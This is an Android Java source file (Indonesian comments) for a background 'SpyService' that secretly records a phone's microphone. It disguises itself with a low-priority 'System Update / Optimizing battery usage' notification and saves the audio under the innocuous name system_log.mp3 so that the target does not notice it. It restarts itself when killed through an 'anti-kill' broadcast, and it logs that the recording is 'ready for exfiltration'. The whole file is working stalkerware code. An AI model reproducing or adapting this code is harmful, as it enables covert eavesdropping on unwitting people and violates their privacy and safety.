package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.IOException;

/**
 * SpyService: Mesin Utama Eksekusi Latar Belakang.
 * Sinkron dengan arsenal fungsionalitas MainActivity.
 */
public class SpyService extends Service {

    private static final String CHANNEL_ID = "system_core_monitor";
    private static final String TAG = "NXOB_SPY";
    private MediaRecorder recorder;
    private boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        // Memulai layanan sebagai Foreground agar mendapatkan prioritas CPU tinggi
        startServiceInForeground();
    }

    private void startServiceInForeground() {
        createNotificationChannel();

        // Menyediakan intent kosong untuk memenuhi syarat notifikasi foreground
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0
        );

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Optimizing battery usage...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setContentIntent(pendingIntent)
                .build();

        // ID 101 harus unik dalam aplikasi
        startForeground(101, notification);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Optimization Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("START_AUDIO_RECORD".equals(action)) {
                startRecording();
            } else if ("STOP_AUDIO_RECORD".equals(action)) {
                stopRecording();
            }
        }
        // START_STICKY: Jika sistem mematikan service, ia akan mencoba hidup kembali otomatis
        return START_STICKY;
    }

    // FITUR: Sadap Mikrofon (Audio Eavesdrop)
    private void startRecording() {
        if (isRecording) return;
        
        try {
            // Menggunakan direktori cache agar file tidak muncul di pemutar musik target
            File logFile = new File(getExternalFilesDir(null), "system_log.mp3");
            String filePath = logFile.getAbsolutePath();

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(filePath);

            recorder.prepare();
            recorder.start();
            isRecording = true;
            Log.d(TAG, "Audio recording started: " + filePath);
        } catch (IOException | RuntimeException e) {
            Log.e(TAG, "Recording failed: " + e.getMessage());
            isRecording = false;
        }
    }

    private void stopRecording() {
        if (recorder != null && isRecording) {
            try {
                recorder.stop();
                recorder.release();
                Log.d(TAG, "Audio recording stopped. Ready for exfiltration.");
            } catch (RuntimeException stopException) {
                Log.e(TAG, "Stop failed (audio too short?): " + stopException.getMessage());
            } finally {
                recorder = null;
                isRecording = false;
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Bound service tidak diperlukan untuk eksekusi background murni
    }

    @Override
    public void onDestroy() {
        // [ANTI-KILL] Kirim sinyal ke RestarterReceiver untuk memicu startService kembali
        Intent broadcastIntent = new Intent("RestartSpyService");
        sendBroadcast(broadcastIntent);
        
        if (isRecording) stopRecording();
        super.onDestroy();
    }
}